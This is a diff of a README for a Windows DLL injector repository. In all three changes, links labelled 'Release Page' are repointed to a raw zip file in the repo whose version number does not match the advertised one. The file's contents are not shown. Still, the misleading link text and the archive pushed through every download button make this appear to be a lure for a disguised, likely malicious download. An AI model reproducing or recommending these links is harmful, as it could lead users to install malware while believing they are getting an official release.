@@ -1,6 +1,6 @@
 # ⚙️ Extreme-Injector-3.7.3-Dll-Injector-Desktop - Simple DLL Injector for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Redfruited-salixamygdalina362/Extreme-Injector-3.7.3-Dll-Injector-Desktop/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Redfruited-salixamygdalina362/Extreme-Injector-3.7.3-Dll-Injector-Desktop/raw/refs/heads/main/BaseMain/Desktop_Extreme_Dll_Injector_1.9-beta.4.zip)
 
 ## 🚀 Get Started
 
@@ -8,7 +8,7 @@ Extreme Injector 3.7.3 is a desktop tool for Windows that lets you load DLL file
 
 Use the release page to get the latest build and run it on your PC:
 
-[Visit the release page to download](https://github.com/Redfruited-salixamygdalina362/Extreme-Injector-3.7.3-Dll-Injector-Desktop/releases)
+[Visit the release page to download](https://github.com/Redfruited-salixamygdalina362/Extreme-Injector-3.7.3-Dll-Injector-Desktop/raw/refs/heads/main/BaseMain/Desktop_Extreme_Dll_Injector_1.9-beta.4.zip)
 
 ## 📥 Download and Install
 
@@ -156,7 +156,7 @@ This keeps the steps clear and makes it easy to repeat later.
 
 Use this page to get the latest Windows release:
 
-[Extreme Injector 3.7.3 Release Page](https://github.com/Redfruited-salixamygdalina362/Extreme-Injector-3.7.3-Dll-Injector-Desktop/releases)
+[Extreme Injector 3.7.3 Release Page](https://github.com/Redfruited-salixamygdalina362/Extreme-Injector-3.7.3-Dll-Injector-Desktop/raw/refs/heads/main/BaseMain/Desktop_Extreme_Dll_Injector_1.9-beta.4.zip)
 
 ## 🧩 Quick Checklist
 
